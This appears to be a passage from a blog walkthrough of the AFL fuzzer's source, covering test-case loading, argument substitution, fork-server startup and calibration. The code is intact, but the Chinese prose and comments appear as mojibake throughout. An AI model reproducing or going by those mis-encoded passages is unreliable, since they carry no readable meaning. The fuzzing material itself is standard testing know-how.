<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Read all testcases from the input directory, then queue them for testing.</span></span><br><span class="line"><span class="comment">   Called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">read_testcases</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dirent</span> **nl;</span><br><span class="line">  s32 nl_cnt;</span><br><span class="line">  u32 i;</span><br><span class="line">  u8* fn;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Auto-detect non-in-place resumption attempts. */</span></span><br><span class="line"></span><br><span class="line">  fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line">  <span class="comment">// é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨in_dir/queue</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span></span><br><span class="line"><span class="comment">     the ordering  of test cases would vary somewhat randomly and would be</span></span><br><span class="line"><span class="comment">     difficult to control. */</span></span><br><span class="line">  <span class="comment">// ä¸ä½¿ç”¨readdiræ˜¯å› ä¸ºæµ‹è¯•ç”¨ä¾‹çš„é¡ºåºå°†éšæœºå˜åŒ–ï¼Œéš¾ä»¥æ§åˆ¶ã€‚è¯»å–åçš„æ–‡ä»¶å°†æŒ‰å­—æ¯æ’åºã€‚</span></span><br><span class="line">  nl_cnt = <span class="built_in">scandir</span>(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">    <span class="built_in">shuffle_ptrs</span>((<span class="type">void</span>**)nl, nl_cnt);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æµ‹è¯•ç”¨ä¾‹æ˜¯å¦åœ¨in_dir/.state/deterministic_done/æ–‡ä»¶å¤¹ä¸­å­˜åœ¨</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    u8* dfn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">lstat</span>(fn, &amp;st) || <span class="built_in">access</span>(fn, R_OK))</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">S_ISREG</span>(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.testcases&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">            <span class="built_in">DMS</span>(st.st_size), <span class="built_in">DMS</span>(MAX_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">       is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">       fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">       and probably very time-consuming. */</span></span><br><span class="line">	<span class="comment">// å¦‚æœå­˜åœ¨åˆ™åˆ¤å®šè¯¥æµ‹è¯•ç”¨ä¾‹å·²å®Œæˆç¡®å®šæ€§å˜å¼‚ï¼Œè¿‡æ»¤è¯¥input</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">    <span class="comment">// å¦‚æœå­˜åœ¨åˆ™åˆ¤å®šè¯¥æµ‹è¯•ç”¨ä¾‹å·²å®Œæˆç¡®å®šæ€§å˜å¼‚ï¼Œè¿‡æ»¤è¯¥input</span></span><br><span class="line">	<span class="comment">// å¦‚æœä¸å­˜åœ¨è¿™åŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">    <span class="built_in">add_to_queue</span>(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(nl); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!queued_paths) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Looks like there are no valid test cases in the input directory! The fuzzer\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    needs one or more test case to start with - ideally, a small file under\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    1 kB or so. The cases must be stored as regular files directly in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    input directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  last_path_time = <span class="number">0</span>;</span><br><span class="line">  queued_at_start = queued_paths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>è¯»å…¥è‡ªåŠ¨ç”Ÿæˆçš„å­—å…¸tokenï¼Œä»<code>in_dir/auto_extras/auto_%06u</code>å¤„ä¾æ¬¡è¯»å–ï¼Œè°ƒç”¨<code>maybe_add_auto</code>æŒ‰è§„åˆ™åŠ å…¥å­—å…¸</p>
<h3 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h3><p>æŠŠåˆå§‹ corpus å¤åˆ¶åˆ°å·¥ä½œç›®å½•çš„ queue æ–‡ä»¶å¤¹ä¸‹ </p>
<p>åœ¨è¾“å‡ºç›®å½•ä¸­ä¸ºè¾“å…¥æµ‹è¯•ç”¨ä¾‹åˆ›å»ºç¡¬é“¾æ¥ï¼Œå…¶ä¸­çš„<code>mark_as_det_done</code>å°†ä¸€äº›ç»è¿‡ç¡®å®šæ€§å˜å¼‚çš„æ–‡ä»¶æ”¾å…¥<code>deterministic_done</code>ç›®å½•ï¼Œä¹‹åå°±ä¸ä¼šå†é‡å¤æµ‹è¯•ã€‚</p>
<h3 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h3><p>å¦‚æœç”¨æˆ·é€šè¿‡ -x é€‰é¡¹æŒ‡å®šäº† dictionaryï¼Œåˆ™ä»é‚£é‡Œå¯¼å…¥ extraï¼ŒåŠ è½½ç”¨æˆ·è‡ªå·±è®¾å®šçš„å­—å…¸tokenï¼Œä»extras_dirè¯»å–extrasåˆ°extrasæ•°ç»„é‡Œï¼Œå¹¶æŒ‰sizeæ’åºã€‚</p>
<h3 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h3><p>å‚æ•°æ˜¯å¦å­˜åœ¨ <code>@@</code>ï¼Œå¦‚æœæœ‰åˆ™æ›¿æ¢<code>argv[i] = cwd/out_dir/.cur_input</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Detect @@ in args. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">detect_file_args</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i = <span class="number">0</span>;</span><br><span class="line">  u8* cwd = <span class="built_in">getcwd</span>(<span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!cwd) <span class="built_in">PFATAL</span>(<span class="string">&quot;getcwd() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (argv[i]) &#123;</span><br><span class="line"></span><br><span class="line">    u8* aa_loc = <span class="built_in">strstr</span>(argv[i], <span class="string">&quot;@@&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (aa_loc) &#123;</span><br><span class="line"></span><br><span class="line">      u8 *aa_subst, *n_arg;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we don&#x27;t have a file name chosen yet, use a safe default. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!out_file)</span><br><span class="line">        out_file = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.cur_input&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Be sure that we&#x27;re always using fully-qualified paths. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (out_file[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>) aa_subst = out_file;</span><br><span class="line">      <span class="keyword">else</span> aa_subst = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, cwd, out_file);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct a replacement argv value. */</span></span><br><span class="line"></span><br><span class="line">      *aa_loc = <span class="number">0</span>;</span><br><span class="line">      n_arg = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s%s%s&quot;</span>, argv[i], aa_subst, aa_loc + <span class="number">2</span>);</span><br><span class="line">      argv[i] = n_arg;</span><br><span class="line">      *aa_loc = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (out_file[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) <span class="built_in">ck_free</span>(aa_subst);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(cwd); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="setup-stdio-check-binary"><a href="#setup-stdio-check-binary" class="headerlink" title="setup stdio -&gt; check binary"></a>setup stdio -&gt; check binary</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»º .cur_input æ–‡ä»¶å¹¶æ‰“å¼€ï¼Œè®¾ä¸º out_fdã€‚æ¥ä¸‹æ¥ fuzzer è¦æŠŠå˜å¼‚å‡ºçš„ input å†™è¿›è¿™é‡Œï¼Œç”± child è¯»å–</span></span><br><span class="line"><span class="keyword">if</span> (!out_file) <span class="built_in">setup_stdio_file</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥ç›®æ ‡ç¨‹åºï¼Œçœ‹æ‰¾ä¸æ‰¾å¾—åˆ°ã€åœ¨ä¸åœ¨ /tmp ç­‰ã€‚</span></span><br><span class="line"><span class="comment">// ä¸èƒ½ä¸ºshellè„šæœ¬ï¼ŒåŒæ—¶æ£€æŸ¥elfæ–‡ä»¶å¤´æ˜¯å¦åˆæ³•åŠç¨‹åºæ˜¯å¦è¢«æ’æ¡©ã€‚</span></span><br><span class="line"><span class="built_in">check_binary</span>(argv[optind]);</span><br></pre></td></tr></table></figure>

<h2 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h2><p>ç”¨ queue ä¸­çš„æ‰€æœ‰ç”¨ä¾‹è·‘ä¸€éç¨‹åºï¼›å¦å¤–ï¼Œå®ƒä½¿ç”¨äº† fork serverã€‚åœ¨ä»£ç ä¸­ï¼Œè¿™ç§ dry run ç§°ä¸ºã€Œcalibrateï¼ˆæ ¡å‡†ï¼‰ã€ã€‚</p>
<ul>
<li>ä¾æ¬¡è¯»å–queueä¸­çš„å†…å®¹</li>
<li>è°ƒç”¨Â <code>calibrate_case</code>Â å‡½æ•°æ ¡å‡†è¯¥æµ‹è¯•ç”¨ä¾‹ï¼Œå¾—åˆ°è¿”å›å€¼<code>res</code>ï¼Œ</li>
<li>æ ¹æ®<code>res</code>åˆ¤æ–­é”™è¯¯ç±»å‹</li>
</ul>
<h3 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h3><p>æ ¡å‡†ï¼šç”¨ä¾‹ä¼šè¢«è¿è¡Œå¤šæ¬¡</p>
<ul>
<li>FAULT_NONEï¼šè¯¥æµ‹è¯•ç”¨ä¾‹ä¸äº§ç”Ÿcrash</li>
<li>FAULT_TMOUTï¼šè¯¥æµ‹è¯•ç”¨ä¾‹äº§ç”Ÿè¶…æ—¶é”™è¯¯ã€‚å½“<code>timeout_given</code>ä¸º2æ—¶è·³è¿‡è¯¥æ–‡ä»¶</li>
<li>FAULT_CRASH ï¼šåˆå§‹æµ‹è¯•ç”¨ä¾‹å°±å¼•å‘äº†å´©æºƒï¼Œéœ€è¦æ’é™¤mem_limitçš„é—®é¢˜</li>
<li>FAULT_ERRORï¼šç›®æ ‡ç¨‹åºæ— æ³•æ‰§è¡Œ</li>
<li>FAULT_NOINSTï¼šæ²¡æ£€æµ‹åˆ°æ’æ¡©ä»£ç ï¼Œç›´æ¥é€€å‡º</li>
<li>FAULT_NOBITSï¼šæ— ç”¨æµ‹è¯•ç”¨ä¾‹ã€‚è¯¥ç”¨ä¾‹æœ‰è·¯å¾„ä¿¡æ¯ä½†æ²¡æ–°è·¯å¾„</li>
</ul>
<p><code>calibrate_case</code>Â å‡½æ•°çš„è¿è¡Œæ—¶æœºè‡³å°‘æœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯ç¨‹åºè¿è¡Œä¹‹åˆï¼Œç”¨äºæ ¡å‡†åˆå§‹ corpusï¼›äºŒæ˜¯å‘ç°äº†æ–°è·¯å¾„ï¼Œå°†æœ‰è¶£çš„ç”¨ä¾‹åŠ å…¥ queue æ—¶ã€‚æ€»ç»“ä¸€å¥ï¼š<strong>è¿›äº† queue çš„ç”¨ä¾‹ï¼Œéƒ½è¦è¢«è¿è¡Œä¸€é<code>calibrate_case</code>Â å‡½æ•°</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">calibrate_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* use_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">                         u32 handicap, u8 from_queue)</span></span></span><br></pre></td></tr></table></figure>

<p>æ ¡å‡†è¿‡ç¨‹æ˜¯å¤šæ¬¡è¿è¡Œç”¨ä¾‹ï¼ˆé»˜è®¤æ˜¯ 8 æ¬¡ï¼‰ï¼Œç»Ÿè®¡å„æ¬¡è¿è¡Œçš„ç»“æœã€‚</p>
<ul>
<li>è‹¥ fork server æ²¡æœ‰å‡†å¤‡å¥½ï¼Œå°±<strong>è°ƒç”¨Â <code>init_forkserver()</code>Â åˆå§‹åŒ– fork server</strong></li>
<li><strong>å¤šæ¬¡è°ƒç”¨Â <code>run_target()</code>Â è¿è¡Œç›®æ ‡ç¨‹åº</strong>ï¼Œè§‚å¯Ÿç»“æœã€‚è‹¥æ²¡æœ‰ä»»ä½• hit count å‘½ä¸­ï¼Œåˆ™è®¤ä¸ºç¨‹åºæœªæ’æ¡©ï¼ŒæŠ¥å‘Šé”™è¯¯ã€‚</li>
<li>å¦‚æœå‘ç°å¯¹æŸç”¨ä¾‹å¤šæ¬¡è¿è¡Œç¨‹åºï¼Œå…¶è¡¨ç°ä¸ä¸€è‡´ï¼Œåˆ™å°†æ‰§è¡Œæ¬¡æ•°æå‡åˆ° 40 æ¬¡ï¼Œå¹¶æ›´æ–°Â <code>var_bytes[]</code>Â ï¼ˆè¿™ä¸ªå…¨å±€å˜é‡è¡¨ç¤º shm ä¸­å“ªäº›ä½ç½®å­˜åœ¨ä¸ä¸€è‡´æ€§ï¼‰ã€‚å¦å¤–ï¼Œå°† queue entry çš„Â <code>var_behavior</code>Â æ ‡è®°è®¾ä¸ºÂ <code>1</code>ã€‚</li>
<li>æ›´æ–° queue entry ä¿¡æ¯ï¼Œä¾‹å¦‚å°†Â <code>exec_us</code>Â å­—æ®µè®¾ä¸ºæ ¡å‡†è¿‡ç¨‹ä¸­çš„æ‰§è¡Œæ—¶é—´å‡å€¼ã€‚</li>
<li><strong>ç»™è¿™ä¸ªç”¨ä¾‹æ‰“åˆ†ï¼Œå¹¶æ›´æ–°Â <code>top_rated</code>Â æŒ‡é’ˆæ•°ç»„ã€‚</strong></li>
</ul>
<h3 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init forkserver"></a>init forkserver</h3><p>fuzzer åˆå§‹åŒ– forkserver</p>
<ol>
<li>forkå‡ºä¸€ä¸ªå­è¿›ç¨‹ç”¨äºæ‰§è¡Œç›®æ ‡ç¨‹åºï¼Œä¹Ÿå°±æ˜¯å°†æ¥çš„fork server</li>
<li>é‡å®šå‘æ–‡ä»¶æè¿°ç¬¦<ul>
<li>æ–‡ä»¶æè¿°ç¬¦1å’Œ2é‡å®šå‘è‡³dev_null_fd</li>
<li>å¦‚æœæŒ‡å®šäº†out_fileåˆ™é‡å®šå‘æ–‡ä»¶æè¿°ç¬¦0è‡³out_fdï¼Œå¦‚æœæ²¡æœ‰æ‰§è¡Œåˆ™é‡å®šå‘è‡³dev_null_fd</li>
</ul>
</li>
<li>å°†æ§åˆ¶ç®¡é“å’ŒçŠ¶æ€ç®¡é“é‡å®šå‘è‡³FORKSRV_FDå’ŒFORKSRV_FD+1ï¼Œç„¶åå…³é—­ç”¨ä¸åˆ°çš„ç®¡é“</li>
<li>è°ƒç”¨execvï¼Œè¿›ç¨‹æ›¿æ¢ï¼Œå­è¿›ç¨‹æ‰§è¡Œç›®æ ‡ç¨‹åºä½œä¸ºforkserverï¼ŒIPCè¿›ç¨‹é—´é€šä¿¡</li>
<li>ç­‰å¾…forkserverå¯åŠ¨ï¼Œä»çŠ¶æ€ç®¡é“ä¸­è¯»å–åˆ°4å­—èŠ‚çš„æ•°æ®ï¼Œåˆ¤å®šforkserverå¯åŠ¨å®Œæ¯•</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Spin up fork server (instrumented mode only). The idea is explained here:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In essence, the instrumentation allows us to skip execve(), and just keep</span></span><br><span class="line"><span class="comment">   cloning a stopped child. So, we just execute once, and then send commands</span></span><br><span class="line"><span class="comment">   through a pipe. The other part of this logic is in afl-as.h. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">init_forkserver</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">itimerval</span> it;</span><br><span class="line">  <span class="comment">// status pipe</span></span><br><span class="line">  <span class="comment">// control pipe</span></span><br><span class="line">  <span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  s32 rlen;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Spinning up the fork server...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">pipe</span>(st_pipe) || <span class="built_in">pipe</span>(ctl_pipe)) <span class="built_in">PFATAL</span>(<span class="string">&quot;pipe() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  forksrv_pid = fork();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å­è¿›ç¨‹</span></span><br><span class="line">  <span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">rlimit</span> r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span></span><br><span class="line"><span class="comment">       soft 128. Let&#x27;s try to fix that... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getrlimit</span>(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">      r.rlim_cur = FORKSRV_FD + <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_NOFILE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem_limit) &#123;</span><br><span class="line"></span><br><span class="line">      r.rlim_max = r.rlim_cur = ((<span class="type">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_AS, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span></span><br><span class="line"><span class="comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span></span><br><span class="line"><span class="comment">         maps - so we should be getting good protection against OOM bugs. */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_DATA, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span></span><br><span class="line"><span class="comment">       before the dump is complete. */</span></span><br><span class="line"></span><br><span class="line">    r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_CORE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Isolate the process and configure standard descriptors. If out_file is</span></span><br><span class="line"><span class="comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setsid</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">dup2</span>(dev_null_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">dup2</span>(out_fd, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">close</span>(out_fd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set up control and status pipes, close the unneeded original fds. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">close</span>(st_pipe[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(out_dir_fd);</span><br><span class="line">    <span class="built_in">close</span>(dev_null_fd);</span><br><span class="line">    <span class="built_in">close</span>(dev_urandom_fd);</span><br><span class="line">    <span class="built_in">close</span>(<span class="built_in">fileno</span>(plot_file));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This should improve performance a bit, since it stops the linker from</span></span><br><span class="line"><span class="comment">       doing extra work post-fork(). */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;LD_BIND_LAZY&quot;</span>)) <span class="built_in">setenv</span>(<span class="string">&quot;LD_BIND_NOW&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set sane defaults for ASAN if nothing else specified. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>, <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;allocator_may_return_null=1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span></span><br><span class="line"><span class="comment">       point. So, we do this in a very hacky way. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot;:&quot;</span></span><br><span class="line">                           <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;allocator_may_return_null=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;msan_track_origins=0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­è¿›ç¨‹è°ƒç”¨ä¸€æ¬¡ execv</span></span><br><span class="line">    <span class="comment">// è¿è¡Œ afl-gcc è¿è¡Œçš„ç¨‹åº</span></span><br><span class="line">    <span class="built_in">execv</span>(target_path, argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span></span><br><span class="line"><span class="comment">       falling through. */</span></span><br><span class="line"></span><br><span class="line">    *(u32*)trace_bits = 